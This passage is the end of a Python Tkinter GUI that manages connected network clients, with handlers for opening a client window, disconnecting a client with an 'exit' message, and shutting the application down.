            menu.add_command(label="Open", command=self._open_client)
            menu.add_command(label="Disconnect", command=self._disconnect_client)
            menu.post(event.x_root, event.y_root)

    def _disconnect_client(self):
        cid = self._selected_cid()
        if cid is None: return
        try:
            if cid in self.engine.clients:
                c = self.engine.clients[cid]
                c["conn"].settimeout(3)
                raw = c.get("raw", False)
                self.engine.send(c["conn"], {"type": "exit"}, raw=raw)
        except: pass
        self.engine._cleanup(cid)
        self._log(f"Client [{cid}] disconnected by user", "red")

    def _open_client(self, event=None):
        cid = self._selected_cid()
        if cid is None: return
        if cid in self.client_windows:
            try: self.client_windows[cid].lift()
            except: del self.client_windows[cid]
        else:
            self.client_windows[cid] = ClientApp(self.root, cid, self.engine)

    def _on_close(self):
        self.engine.stop()
        if self.own_root:
            self.root.destroy()
        else:
            for w in list(self.client_windows.values()):
                try: w.destroy()
                except: pass

    def run(self):
        if self.own_root:
            self.root.mainloop()

if __name__ == "__main__":
    MainApp().run()
